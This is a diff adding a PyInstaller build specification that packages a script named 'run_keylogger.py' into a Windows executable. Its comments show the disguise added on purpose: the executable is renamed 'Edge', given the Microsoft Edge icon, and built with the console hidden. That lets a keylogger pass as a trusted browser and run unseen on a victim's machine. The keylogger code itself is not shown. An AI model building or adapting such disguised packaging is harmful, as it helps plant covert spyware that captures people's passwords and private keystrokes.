@@ -1,0 +1,44 @@
+# -*- mode: python ; coding: utf-8 -*-
+from PyInstaller.utils.hooks import collect_submodules
+
+hidden_imports_webbrowser = collect_submodules('webbrowser')
+hidden_imports_pynput = collect_submodules('pynput')
+all_hidden_imports = hidden_imports_webbrowser + hidden_imports_pynput
+block_cipher = None
+
+
+a = Analysis(['run_keylogger.py'],
+             pathex=['C:\\Users\\Arman\\Desktop\\Github\\hacking\\keylogger'],
+             binaries=[],
+             datas=[],
+             hiddenimports=all_hidden_imports,
+             hookspath=[],
+             hooksconfig={},
+             runtime_hooks=[],
+             excludes=[],
+             win_no_prefer_redirects=False,
+             win_private_assemblies=False,
+             cipher=block_cipher,
+             noarchive=False)
+pyz = PYZ(a.pure, a.zipped_data,
+             cipher=block_cipher)
+
+exe = EXE(pyz,
+          a.scripts,
+          a.binaries,
+          a.zipfiles,
+          a.datas,
+          [],
+          name='Edge',  # I have changed the name of the .exe
+          debug=False,
+          bootloader_ignore_signals=False,
+          strip=False,
+          upx=True,
+          upx_exclude=[],
+          runtime_tmpdir=None,
+          console=False,  # Default was true, I have changed to false
+          disable_windowed_traceback=False,
+          target_arch=None,
+          codesign_identity=None,
+          entitlements_file=None,
+          icon = r'C:\Users\Arman\Desktop\Coding\Desktop Icons\edge_icon.ico')  # I have added an icon option
